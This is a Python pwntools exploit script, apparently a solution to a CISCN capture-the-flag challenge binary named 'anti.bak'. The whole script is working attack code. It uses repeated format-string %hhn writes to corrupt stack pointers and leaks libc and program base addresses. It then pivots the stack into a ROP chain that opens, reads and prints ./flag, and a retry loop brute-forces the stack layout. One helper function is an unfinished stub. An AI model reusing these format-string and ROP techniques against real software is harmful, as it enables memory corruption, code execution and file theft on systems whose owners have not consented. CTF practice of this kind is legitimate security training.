#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./anti.bak')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./anti.bak')

def SetVal(addr,val):
    payload = "%6"
    return

def exp():
    #leak libc
    #target = 0xb86690
    target = 0x817690
    p.recvuntil("Gift: 0x")
    stack_addr = int(p.recvline().strip('\n'),16)
    log.success("stack addr => " + hex(stack_addr))
    p.recvuntil("Come in quickly, I will close the door.")
    last_byte = stack_addr & 0xffff
    payload = "%"+str((last_byte+0x20)&0xff)+"c%6$hhn"
    #gdb.attach(p,'b printf')
    #payload += "%"+str(((target&0xff)-(last_byte-0x10))&0xff)+"c%10$hhn"

    #payload = payload.ljust(0x30,'\x00')

    p.sendline(payload)
    payload = "%"+str(target&0xff)+"c%10$hhn"
    sleep(0.02)
    p.sendline(payload)

    #
    payload = "%"+str(((last_byte+0x21)&0xff))+"c%6$hhn"
    sleep(0.02)
    p.sendline(payload)
    payload = "%"+str((target&0xffff)>>8)+"c%10$hhn"
    sleep(0.02)
    p.sendline(payload)
    #

    payload = "%"+str(((last_byte+0x22)&0xff))+"c%6$hhn"
    sleep(0.02)
    p.sendline(payload)
    payload = "%"+str((target>>16))+"c%10$hhn"
    sleep(0.02)
    p.sendline(payload)

    payload = "%"+str(0x2)+"c%13$hhn"
    sleep(0.02)
    p.sendline(payload)
    #leak all addr

    payload = "+%13$p-+%7$p-"
    sleep(0.02)
    p.sendline(payload)
    p.recvuntil("+0x")
    libc_base = int(p.recvuntil("-",drop=True),16) - libc.sym['_IO_2_1_stdout_'] - 0x70
    log.success("libc base => " + hex(libc_base))
    #
    p.recvuntil("+0x")
    proc_base = int(p.recvuntil("-",drop=True),16) - 0xf96
    log.success("proc base => " + hex(proc_base))
    #
    p_rsp_r3 = proc_base + 0x000000000000104d

    payload = "%"+str((last_byte+0x10)&0xff)+"c%6$hhn"
    sleep(0.02)
    p.sendline(payload)
    target = p_rsp_r3 & 0xff
    payload = "%"+str(target)+"c%10$hhn"
    sleep(0.02)
    p.sendline(payload)

    #
    payload = "%"+str((last_byte+0x11)&0xff)+"c%6$hhn"
    sleep(0.02)
    p.sendline(payload)
    target = (p_rsp_r3 & 0xffff) >> 8
    payload = "%"+str(target)+"c%10$hhn"
    sleep(0.02)
    p.sendline(payload)
    #

    target = proc_base + 0x202040
    payload = "%"+str((last_byte+0x18)&0xff)+"c%6$hhn"
    sleep(0.02)
    p.sendline(payload)
    payload = "%"+str(target&0xff)+"c%10$hhn"
    sleep(0.02)
    p.sendline(payload)
    payload = "%"+str((last_byte+0x19)&0xff)+"c%6$hhn"
    sleep(0.02)
    p.sendline(payload)
    payload = "%"+str((target&0xffff)>>8)+"c%10$hhn"
    sleep(0.02)
    p.sendline(payload)
    payload = "%"+str((last_byte+0x1a)&0xff)+"c%6$hhn"
    sleep(0.02)
    p.sendline(payload)
    payload = "%"+str((target&0xffffff)>>16)+"c%10$hhn"
    sleep(0.02)
    p.sendline(payload)

    #
    p_rdi = libc_base + 0x0000000000021112
    p_rsi = libc_base + 0x00000000000202f8
    p_rdx = libc_base + 0x0000000000001b92
    p_rax = libc_base + 0x000000000003a738
    syscall = libc_base + 0x00000000000bc3f5
    payload = "Ciscn20\x00"
    payload += "./flag\x00\x00"*2
    payload += flat([
        p_rdi,target+0x8,p_rsi,0,p_rdx,0,p_rax,2,syscall,
        p_rdi,1,p_rsi,target+0x200,p_rdx,0x30,p_rax,0,syscall,
        p_rdi,2,p_rsi,target+0x200,p_rdx,0x30,p_rax,1,syscall
        ])
    sleep(0.02)
    p.sendline(payload)

while True:
    try:
        exp()
        p.interactive()
        p.close()
    except:
        p.close()
    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./anti.bak')
